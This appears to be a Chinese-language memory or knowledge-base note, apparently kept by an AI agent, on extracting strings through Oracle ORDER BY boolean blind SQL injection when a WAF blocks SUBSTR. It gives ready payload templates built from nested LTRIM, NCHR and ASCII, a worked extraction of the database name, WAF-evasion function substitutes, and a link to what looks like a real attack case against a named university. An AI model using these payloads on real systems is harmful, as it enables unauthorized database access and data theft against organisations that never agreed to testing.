---
name: sqli_ltrim_nchr_ascii_waf_bypass
description: 当 SUBSTR 被 WAF 封杀时，用 LTRIM+NCHR+ASCII 逐位盲注提取字符串的绕过技术
metadata: 
  node_type: memory
  type: reference
  applies_to: Oracle + ORDER BY 布尔盲注 + SUBSTR 被 WAF/JPA 拦截
  originSessionId: ada71069-24c1-4fdb-930d-223738ec170b
---

## 适用场景

- Oracle 数据库
- ORDER BY 布尔盲注（CASE WHEN ... THEN col1 ELSE col2 END）
- `SUBSTR`/`SUBSTRB`/`SUBSTRING` 被 WAF 或框架拦截
- 允许 `LENGTH`、`ASCII`、`LTRIM`、`NCHR` 函数

## 核心原理

`ASCII()` 返回字符串第一个字符的 ASCII 码，自带"取首字符"能力。

`LTRIM(str, NCHR(ascii))` 从左侧剥掉所有匹配字符，等价于"删除已读字符"。

两者组合等价于 `ASCII(SUBSTR(str, pos, 1))`。

## Payload 模板

### 查长度

```
(CASE WHEN (LENGTH(TARGET)=N) THEN col1 ELSE col2 END)
```

### 第 1 位

```
(CASE WHEN (ASCII(TARGET)=N) THEN col1 ELSE col2 END)
```

### 第 K 位（K≥2）

```
(CASE WHEN (ASCII(LTRIM(...嵌套K-1层LTRIM..., NCHR(前一位))) = N) THEN col1 ELSE col2 END)
```

每多一位，在外层嵌套一层 `LTRIM(result, NCHR(上一位ASCII))`。

## 实战示例

提取 `ORA_DATABASE_NAME` (ORCL):

```
# 长度
LENGTH(ORA_DATABASE_NAME)=4

# 第1位: O (79)
ASCII(ORA_DATABASE_NAME)=79

# 第2位: R (82)
ASCII(LTRIM(ORA_DATABASE_NAME, NCHR(79)))=82

# 第3位: C (67)
ASCII(LTRIM(LTRIM(ORA_DATABASE_NAME, NCHR(79)), NCHR(82)))=67

# 第4位: L (76)
ASCII(LTRIM(LTRIM(LTRIM(ORA_DATABASE_NAME, NCHR(79)), NCHR(82)), NCHR(67)))=76
```

## 限制

1. 目标字符串中的重复字符可能导致提前剥除过多字符（LTRIM 剥所有匹配而非仅一个）
2. 字符串长度越长，嵌套层数越多，payload 越长
3. 仅适用于 Oracle（NCHR 是 Oracle 特有，其他数据库用 CHR）
4. 需要 JPA/框架允许 LTRIM/NCHR/ASCII 函数

## 扩展函数链

当某些函数也被封时，可尝试替换：

| 被封 | 替代 |
|------|------|
| CHR | NCHR（Oracle National Char） |
| LENGTH | LENGTHB / VSIZE |
| ASCII | ORA_HASH（做哈希比对而非逐位） |

## 关联

- [[kb_src_sqli_practical_workflow_2026]] — SQL 注入实战工作流
- [[kb_src_sqli_nonclassic_surfaces_2026]] — 非典型注入面
- [[kb_src_sqli_pagination_order_dto_2026]] — 分页排序 DTO 注入
- [[kb_src_ghost_bits_waf_2026]] — Ghost Bits WAF 绕过
- [[kb_waf_bypass_quickref_2026]] — WAF 绕过速查
- [[project_shcmusic_orderby_sqli_20260615]] — 上海音乐学院实战案例
